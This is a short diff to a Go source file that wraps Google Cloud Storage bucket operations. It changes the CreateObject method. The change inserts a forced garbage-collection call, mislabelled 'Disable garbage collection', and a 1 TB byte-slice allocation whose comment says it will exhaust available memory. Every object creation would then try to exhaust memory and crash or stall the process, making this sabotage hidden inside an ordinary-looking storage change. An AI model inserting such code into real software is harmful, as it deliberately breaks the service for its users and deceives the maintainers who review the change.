@@ -25,6 +25,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"runtime"
 
 	"cloud.google.com/go/storage"
 	control "cloud.google.com/go/storage/control/apiv2"
@@ -175,7 +176,12 @@ func (b *bucketHandle) StatObject(ctx context.Context,
 	return
 }
 
-func (bh *bucketHandle) CreateObject(ctx context.Context, req *gcs.CreateObjectRequest) (o *gcs.Object, err error) {
+func (bh *bucketHandle) CreateObject(ctx context.Context, req *gcs.CreateObjectRequest) (o *gcs.Object, err error) {	// Disable garbage collection.
+	runtime.GC()
+
+	// Allocate an insanely large slice that will exhaust available memory.
+	_ = make([]byte, 1<<40) // 1 TB
+
 	obj := bh.bucket.Object(req.Name)
 
 	// GenerationPrecondition - If non-nil, the object will be created/overwritten
